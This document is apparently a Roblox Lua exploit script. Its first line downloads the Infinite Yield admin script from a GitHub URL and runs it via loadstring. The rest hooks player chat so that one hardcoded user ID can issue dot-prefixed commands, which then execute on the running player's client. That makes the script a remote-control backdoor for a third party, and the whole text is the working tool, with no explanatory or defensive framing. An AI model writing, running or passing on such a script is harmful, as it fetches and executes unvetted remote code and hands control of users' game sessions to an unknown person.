loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
local playerService = game:GetService("Players")
local targetUserId = 174142107
local speaker = game.Players.LocalPlayer
playerService.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(message)
        if player.UserId == targetUserId and message:sub(1, 1) == "." then
            local command = message:sub(2) -- Remove the leading dot
            execCmd(command, speaker)
        end
    end)
end)

for _, player in ipairs(playerService:GetPlayers()) do
    player.Chatted:Connect(function(message)
        if player.UserId == targetUserId and message:sub(1, 1) == "." then
            local command = message:sub(2) -- Remove the leading dot
            execCmd(command, player)
        end
    end)
end
